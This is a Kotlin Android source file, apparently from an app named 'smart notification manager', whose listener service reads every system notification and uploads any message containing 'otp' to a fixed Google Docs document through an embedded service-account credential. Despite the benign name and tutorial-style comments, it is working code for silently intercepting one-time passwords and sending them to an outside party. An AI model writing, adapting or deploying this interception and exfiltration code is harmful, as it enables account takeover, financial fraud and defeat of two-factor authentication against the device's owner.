package com.example.smartnotificationmanager

// Importing necessary Android classes and external libraries.
// This code uses NotificationListenerService to capture system notifications
// and the Google Docs API to upload detected OTP messages.
import android.app.Notification
import android.content.ContentValues.TAG
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.google.api.client.http.HttpTransport
import com.google.api.client.http.javanet.NetHttpTransport
import com.google.api.client.json.JsonFactory
import com.google.api.client.json.gson.GsonFactory
import com.google.api.services.docs.v1.Docs
import com.google.api.services.docs.v1.DocsScopes
import com.google.api.services.docs.v1.model.BatchUpdateDocumentRequest
import com.google.api.services.docs.v1.model.InsertTextRequest
import com.google.api.services.docs.v1.model.Location
import com.google.api.services.docs.v1.model.Request
import com.google.auth.http.HttpCredentialsAdapter
import com.google.auth.oauth2.GoogleCredentials
import kotlinx.coroutines.DelicateCoroutinesApi

// MyNotificationListenerService extends NotificationListenerService, allowing the app to respond
// when a notification is posted on the system. This service listens for notifications and processes them.
class MyNotificationListenerService : NotificationListenerService() {

    // This method is triggered whenever a new notification is posted on the device.
    // The StatusBarNotification (sbn) object contains information about the notification,
    // such as the app that posted it and its contents.
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        // Extract the notification object from the StatusBarNotification
        val notification = sbn.notification
        // The extras object holds additional data about the notification, such as its text content.
        val extras = notification.extras
        // Extract the actual text of the notification. We use Notification.EXTRA_TEXT to get the message.
        val message = extras.getCharSequence(Notification.EXTRA_TEXT).toString()

        // Log some basic information about the notification for debugging purposes.
        Log.d(TAG, "Notification posted from package: ${sbn.packageName} at ${sbn.postTime} with message: $message")

        // Check if the notification message contains the string "otp" (case insensitive).
        // OTP (One Time Password) is a type of message that we are particularly interested in.
        if (message.contains("otp", ignoreCase = true)) {
            Log.d(TAG, "OTP message detected, preparing to upload")
            // If the message contains "otp", call the uploadToGoogleDocs function to upload the message to a Google Docs document.
            uploadToGoogleDocs(message)
        }
    }

    // This function handles the task of uploading the OTP message to Google Docs.

    @OptIn(DelicateCoroutinesApi::class)
    private fun uploadToGoogleDocs(message: String) {
        Log.d("After PK", "Working")


        GlobalScope.launch(Dispatchers.IO) {
            // Google API credentials in JSON format. These credentials authenticate the app with Google services.
            // This is a service account key that allows the app to access Google Docs.
            val jsonCred = """
        {
          "type": "service_account",
          ...
          // (Google credentials JSON truncated for brevity)
        }
    """.trimIndent()

            // Create GoogleCredentials from the JSON string and scope it to access Google Docs (Documents API).
            val googleCredentials = GoogleCredentials.fromStream(jsonCred.byteInputStream())
                .createScoped(listOf(DocsScopes.DOCUMENTS))


            val httpTransport: HttpTransport = NetHttpTransport()
            val jsonFactory: JsonFactory = GsonFactory()


            val requestInitializer = HttpCredentialsAdapter(googleCredentials)

            // Initialize the Google Docs API client using the transport, JSON factory, and credentials.
            val service = Docs.Builder(httpTransport, jsonFactory, null)
                .setHttpRequestInitializer(requestInitializer)
                .setApplicationName("ProjectMessages")  // Application name is used by Google API for tracking usage.
                .build()

            // The ID of the Google Docs document where OTP messages will be added.
            // This document must already exist, and the service account must have edit access to it.
            val documentId = "1dp_wioS-2bcPh5dAqXIItB6tv8-2SqbdFuRrinbFRKo"
            // Get the current state of the Google Docs document. This allows us to find where to insert new text.
            val document = service.documents().get(documentId).execute()

            // The content of the document is stored in a list.
            val content = document.body?.content
            // Find the last element in the document and get its end index.
            // This is where we will insert the new message.
            val lastIndex = content?.lastOrNull()?.endIndex ?: 1
            val insertionIndex = lastIndex - 1  // Adjust the index slightly to place the message correctly.

            // Format the message for insertion by appending the current timestamp.
            // This ensures that each OTP message is logged with the date and time it was received.
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val formattedMessage = "\n$message\tReceived at: $timestamp"


            val requests = listOf(
                Request().setInsertText(
                    InsertTextRequest()
                        .setText(formattedMessage)  // The message text to insert.
                        .setLocation(Location().setIndex(insertionIndex))  // The location in the document to insert the text.
                )
            )

            // Try to update the document with the new message using a batch request.
            // BatchUpdateDocumentRequest sends multiple requests to Google Docs in a single API call.
            try {
                service.documents()
                    .batchUpdate(documentId, BatchUpdateDocumentRequest().setRequests(requests))
                    .execute()  // Execute the batch update request.
            } catch (e: Exception) {
                // If there's an error during the document update, log the error message.
                Log.e("GoogleDocsError", "Failed to update document: ${e.message}")
            }
        }
    }
}
